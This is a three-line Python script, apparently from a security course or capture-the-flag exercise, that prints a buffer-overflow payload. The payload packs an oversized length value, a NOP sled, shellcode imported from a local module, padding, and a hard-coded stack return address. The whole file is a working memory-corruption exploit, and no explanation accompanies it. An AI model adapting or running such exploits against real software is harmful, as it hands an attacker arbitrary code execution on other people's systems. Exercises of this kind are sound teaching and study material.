from struct import pack
from shellcode import shellcode
print(pack('<I', 0x4000000f) + ('\x90'*20) + shellcode + ('A'*35) + pack('<I', 0xbffe9b70))
